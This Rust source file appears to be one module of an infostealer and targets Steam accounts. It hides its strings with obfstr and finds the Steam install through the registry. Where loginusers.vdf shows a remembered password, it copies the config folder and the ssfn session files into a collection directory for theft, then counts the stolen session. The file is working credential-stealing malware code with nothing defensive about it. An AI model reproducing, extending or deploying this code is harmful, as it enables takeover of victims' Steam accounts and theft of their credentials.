use crate::alloc::borrow::ToOwned;
use alloc::vec::Vec;
use collector::{Collector, Software};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{copy_content, copy_file, copy_folder, FileSystem};
use obfstr::obfstr as s;
use regedit::{read_registry_value, RegistryValue};
use tasks::{parent_name, Task};
use windows_sys::Win32::System::Registry::HKEY_CURRENT_USER;

pub(crate) struct SteamTask;

impl<C: Collector, F: FileSystem> Task<C, F> for SteamTask {
    parent_name!("Steam");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(steam_path) = steam_path() else {
            return
        };

        if !StorageFileSystem.is_exists(&steam_path) {
            return
        }

        let config_path = &steam_path / s!("config");

        if copy_config_path(
            StorageFileSystem,
            config_path,
            steam_path,
            filesystem,
            parent
        ).is_none() {
            return
        }

        collector.get_software().increase_steam_session();
    }
}

fn steam_path() -> Option<Path> {
    let RegistryValue::String(root) = read_registry_value(HKEY_CURRENT_USER, s!("Software\\Valve\\Steam"), s!("SteamPath"))
        .ok()?
    else {
        return None;
    };

    Some(Path::new(root))
}

fn copy_config_path<
    SrcFsRef, SrcFs, DstFsRef, DstFs, S, P, D
>(
    src_fs: SrcFsRef,
    config_path: S,
    steam_path: P,
    dst_fs: DstFsRef,
    save_path: D
) -> Option<()>
where
    SrcFsRef: AsRef<SrcFs>,
    DstFsRef: AsRef<DstFs>,
    SrcFs: FileSystem,
    DstFs: FileSystem,
    S: AsRef<Path>,
    P: AsRef<Path>,
    D: AsRef<Path>,
{
    let src_fs = src_fs.as_ref();
    let config_path = config_path.as_ref();
    let steam_path = steam_path.as_ref();
    let dst_fs = dst_fs.as_ref();
    let save_path = save_path.as_ref();

    let login_file = config_path / s!("loginusers.vdf");

    let contents = src_fs.read_file(login_file).ok()?;
    let target = "\"RememberPassword\"\t\t\"1\"".as_bytes();
    if !contents.windows(target.len()).any(|chunk| chunk == target) {
        return None
    }

    copy_folder(src_fs, config_path, dst_fs, save_path).ok()?;

    for file in src_fs.list_files_filtered(steam_path, &|file| {
        src_fs.is_file(file) && file.name().unwrap().starts_with("ssfn")
    })? {
       copy_file(src_fs, file, dst_fs, save_path, true).ok()?;
    }

    Some(())
}